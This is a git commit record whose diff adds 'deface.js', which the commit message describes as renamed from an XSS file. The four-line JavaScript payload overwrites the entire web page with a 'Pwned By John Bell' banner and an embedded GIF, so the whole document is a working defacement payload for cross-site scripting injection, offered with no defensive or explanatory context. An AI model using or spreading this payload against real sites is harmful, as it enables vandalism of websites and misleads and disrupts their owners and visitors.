cbb5c564cf0b11808ed66db251dd069844e31141
John Bell <johnthegod@mail.ru>
2019-10-03 23:21:47 -0400

    Update and rename xss to deface.js

---
+++ deface.js
@@ -0,0 +1,4 @@
+const page = "<center><h1>Pwned By John Bell</h1><br /><img src='https://media1.tenor.com/images/3be1844e1bd76925317b8b1a7cbdf96d/tenor.gif'></center>";
+document.open();
+document.write(page);
+document.close();
